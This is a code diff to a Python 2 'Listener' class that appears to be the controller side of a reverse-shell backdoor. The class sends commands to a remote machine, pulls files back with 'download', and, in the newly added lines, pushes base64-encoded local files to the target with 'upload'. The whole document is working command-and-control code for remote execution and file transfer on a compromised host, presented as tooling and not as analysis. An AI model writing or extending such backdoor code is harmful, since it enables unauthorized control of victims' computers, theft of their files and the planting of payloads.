@@ -36,15 +36,27 @@ class Listener:
         return self.reliable_receive()
 
     def write_file(self,path,content):
+        '''Method to write a file sent over the socket'''
         with open(path,"wb") as file:
             file.write(base64.b64decode(content))
             return "[+] Download successful."
+
+    def read_file(self,path):
+        '''Method to read a file to send over the socket'''
+        with open(path,"rb") as file:
+            return base64.b64encode(file.read())
 
     def run(self):
         while True:
             #Set the command you want to enter
             command = raw_input(">> ") #this is for python 2
             command = command.split(" ")
+
+            #if upload a file, the content is added at the end of command list
+            if command[0] == "upload":
+                file_content = self.read_file(command[1])
+                command.append(file_content)
+
             result = self.execute_remotely(command)
             if command[0] == "download":
                 result = self.write_file(command[1],result)
